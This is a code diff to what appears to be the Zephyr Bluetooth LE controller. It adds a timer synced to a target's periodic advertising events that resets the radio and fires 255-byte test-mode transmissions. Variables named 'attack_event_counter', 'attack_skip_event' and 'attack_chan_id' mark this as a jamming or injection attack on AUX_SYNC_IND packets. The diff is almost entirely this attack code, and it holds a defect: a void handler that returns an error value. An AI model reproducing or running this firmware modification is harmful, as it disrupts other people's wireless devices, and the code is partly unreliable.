@@ -33,6 +33,7 @@
 #include "lll_conn.h"
 #include "lll_sync.h"
 #include "lll_sync_iso.h"
+#include "lll_chan.h"
 
 #include "ull_filter.h"
 #include "ull_scan_types.h"
@@ -648,6 +649,62 @@ bool ull_sync_setup_sid_match(struct ll_scan_set *scan, uint8_t sid)
 		  (sid == scan->periodic.sid)));
 }
 
+// AUX_SYNC_IND ONLY!
+static bool flag = 0;
+extern uint16_t attack_event_counter;
+extern uint16_t attack_skip_event;
+extern uint16_t attack_chan_id;
+
+void my_work_handler(struct k_work *work)
+{
+    DEBUG_RADIO_ACTIVE(flag);
+	flag ^= true;
+
+	radio_reset();
+
+	uint8_t channel = lll_chan_sel_2_custom(attack_event_counter + attack_skip_event, attack_chan_id);
+	attack_event_counter++;
+
+	struct bt_hci_cp_le_tx_test *cp;
+	struct net_buf *buf;
+
+	buf = bt_hci_cmd_create(BT_HCI_OP_LE_TX_TEST, sizeof(*cp));
+	if (!buf) {
+		return -ENOBUFS;
+	}
+
+	cp = net_buf_add(buf, sizeof(*cp));
+	cp->tx_ch = 6;
+	cp->test_data_len = 255;
+	cp->pkt_payload = BT_HCI_TEST_PKT_PAYLOAD_01010101;
+	int r_val = bt_hci_cmd_send(BT_HCI_OP_LE_TX_TEST, buf);
+
+	// struct bt_hci_cp_le_tx_test *cp;
+	// struct net_buf *buf;
+
+	// buf = bt_hci_cmd_create(BT_HCI_OP_LE_TX_TEST, sizeof(*cp));
+	// if (!buf) {
+	// 	return -ENOBUFS;
+	// }
+
+	// cp = net_buf_add(buf, sizeof(*cp));
+	// cp->tx_ch = channel;
+	// cp->test_data_len = 255;
+	// cp->pkt_payload = BT_HCI_TEST_PKT_PAYLOAD_01010101;
+	// int r_val = bt_hci_cmd_send(BT_HCI_OP_LE_TX_TEST, buf);
+	
+	printk("sent on %u\n", channel);
+}
+
+K_WORK_DEFINE(my_work, my_work_handler);
+
+void my_timer_handler(struct k_timer *dummy)
+{
+	k_work_submit(&my_work);
+}
+
+K_TIMER_DEFINE(my_timer, my_timer_handler, NULL);
+
 void ull_sync_setup(struct ll_scan_set *scan, struct ll_scan_aux_set *aux,
 		    struct node_rx_hdr *node_rx, struct pdu_adv_sync_info *si)
 {
@@ -835,6 +892,8 @@ void ull_sync_setup(struct ll_scan_set *scan, struct ll_scan_aux_set *aux,
 	ticks_slot_offset += HAL_TICKER_US_TO_TICKS(EVENT_OVERHEAD_START_US);
 
 	sync->lll_sync_prepare = lll_sync_create_prepare;
+
+	k_timer_start(&my_timer, K_USEC(sync_offset_us), K_USEC(interval_us));
 
 	ret = ticker_start(TICKER_INSTANCE_ID_CTLR, TICKER_USER_ID_ULL_HIGH,
 			   (TICKER_ID_SCAN_SYNC_BASE + sync_handle),
